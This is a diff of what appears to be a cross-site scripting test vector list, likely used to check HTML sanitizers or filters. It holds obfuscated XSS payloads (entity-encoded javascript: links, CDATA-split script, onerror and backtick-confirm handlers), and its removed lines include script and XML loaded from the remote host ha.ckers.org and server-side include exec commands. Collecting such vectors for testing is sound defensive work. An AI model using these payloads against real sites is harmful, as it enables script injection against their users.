@@ -379,10 +379,7 @@ x”</title><img src%3dx onerror%3dalert(1)>
 <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
 '';!--"<XSS>=&{()}
 <!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC="javas<![CDATA[cript:alert('XSS');">
-<XML SRC="http://ha.ckers.org/xsstest.xml" ID=I></XML>
 <HTML><BODY>
-<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
-<!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 <? echo('<SCR)';
 <w="/x="y>"/OndbLcLick=`<`[confir\u006d``]>z
 >>> vectors()
